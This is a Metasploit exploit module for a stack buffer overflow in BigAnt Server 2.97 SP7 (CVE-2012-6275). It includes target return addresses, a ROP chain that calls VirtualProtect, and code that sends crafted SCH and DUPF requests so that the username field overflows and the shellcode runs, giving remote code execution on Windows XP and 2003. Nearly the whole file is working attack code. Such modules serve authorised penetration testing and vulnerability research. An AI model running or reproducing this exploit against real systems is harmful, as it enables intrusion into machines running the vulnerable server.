##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BigAnt Server 2 SCH And DUPF Buffer Overflow',
			'Description'    => %q{
					This exploits a stack buffer overflow in BigAnt Server 2.97 SP7. The
				vulnerability is due to the dangerous usage of strcpy while handling errors. This
				module uses a combination of SCH and DUPF request to trigger the vulnerability, and
				has been tested successfully against version 2.97 SP7 over Windows XP SP3 and
				Windows 2003 SP2.
			},
			'Author'         =>
				[
					'Hamburgers Maccoy', # Vulnerability discovery
					'juan vazquez'       # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-6275' ],
					[ 'US-CERT-VU', '990652' ],
					[ 'BID', '57214' ],
					[ 'OSVDB', '89344' ]
				],
			'Payload'        =>
				{
					'Space'       => 2500,
					'BadChars'    => "\x00\x0a\x0d\x25\x27",
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'BigAnt Server 2.97 SP7 / Windows XP SP3',
						{
							'Offset'     => 629,
							'Ret'        => 0x77c21ef4, # ppr from msvcrt
							'JmpESP'     => 0x77c35459, # push esp # ret from msvcrt
							'FakeObject' => 0x77C60410 # .data from msvcrt
						}
					],
					[ 'BigAnt Server 2.97 SP7 / Windows 2003 SP2',
						{
							'Offset'      => 629,
							'Ret'         => 0x77bb287a, # ppr from msvcrt
							'FakeObject'  => 0x77bf2460, # .data from msvcrt
							:callback_rop => :w2003_sp2_rop
						}
					]
				],
			'Privileged'     => true,
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Jan 09 2013'))

			register_options([Opt::RPORT(6661)], self.class)
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V")[0].to_i
	end

	def nop
		return make_nops(4).unpack("V")[0].to_i
	end

	def w2003_sp2_rop
		rop_gadgets =
			[
				0x77bc5d88, # POP EAX # RETN
				0x77ba1114, # <- *&VirtualProtect()
				0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
				junk,
				0x77bb0c86, # XCHG EAX,ESI # RETN
				0x77bc9801, # POP EBP # RETN
				0x77be2265, # ptr to 'push esp #  ret'
				0x77bc5d88, # POP EAX # RETN
				0x03C0990F,
				0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
				0x77bb48d3, # POP EBX, RET
				0x77bf21e0, # .data
				0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
				0x77bbfc02, # POP ECX # RETN
				0x77bef001, # W pointer (lpOldProtect) (-> ecx)
				0x77bd8c04, # POP EDI # RETN
				0x77bd8c05, # ROP NOP (-> edi)
				0x77bc5d88, # POP EAX # RETN
				0x03c0984f,
				0x77bdd441, # SUB EAX, 03c0940f
				0x77bb8285, # XCHG EAX,EDX # RETN
				0x77bc5d88, # POP EAX # RETN
				nop,
				0x77be6591, # PUSHAD # ADD AL,0EF # RETN
			].pack("V*")

		return rop_gadgets
	end

	def exploit

		sploit = rand_text_alpha(target['Offset'])
		sploit << [target.ret].pack("V")
		sploit << [target['FakeObject']].pack("V")
		sploit << [target['FakeObject']].pack("V")
		if target[:callback_rop] and self.respond_to?(target[:callback_rop])
			sploit << self.send(target[:callback_rop])
		else
			sploit << [target['JmpESP']].pack("V")
		end
		sploit << payload.encoded

		random_filename = rand_text_alpha(4)
		random_date = "#{rand_text_numeric(4)}-#{rand_text_numeric(2)}-#{rand_text_numeric(2)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)}"
		random_userid = rand_text_numeric(1)
		random_username = rand_text_alpha_lower(5)
		random_content = rand_text_alpha(10 + rand(10))

		sch = "SCH 16\n"
		sch << "cmdid: 1\n"
		sch << "content-length: 0\n"
		sch << "content-type: Appliction/Download\n"
		sch << "filename: #{random_filename}.txt\n"
		sch << "modified: #{random_date}\n"
		sch << "pclassid: 102\n"
		sch << "pobjid: 1\n"
		sch << "rootid: 1\n"
		sch << "sendcheck: 1\n"
		sch << "source_cmdname: DUPF\n"
		sch << "source_content-length: 116619\n"
		sch << "userid: #{random_userid}\n"
		sch << "username: #{sploit}\n\n"

		print_status("Trying target #{target.name}...")

		connect
		print_status("Sending SCH request...")
		sock.put(sch)
		res = sock.get_once
		if res.nil?
			fail_with(Exploit::Failure::Unknown, "No response to the SCH request")
		end
		if res=~ /scmderid: \{(.*)\}/
			scmderid = $1
		else
			fail_with(Exploit::Failure::UnexpectedReply, "scmderid value not found in the SCH response")
		end

		dupf = "DUPF 16\n"
		dupf << "cmdid: 1\n"
		dupf << "content-length: #{random_content.length}\n"
		dupf << "content-type: Appliction/Download\n"
		dupf << "filename: #{random_filename}.txt\n"
		dupf << "modified: #{random_date}\n"
		dupf << "pclassid: 102\n"
		dupf << "pobjid: 1\n"
		dupf << "rootid: 1\n"
		dupf << "scmderid: {#{scmderid}}\n"
		dupf << "sendcheck: 1\n"
		dupf << "userid: #{random_userid}\n"
		dupf << "username: #{random_username}\n\n"
		dupf << random_content

		print_status("Sending DUPF request...")
		sock.put(dupf)
		#sock.get_once
		disconnect

	end

end
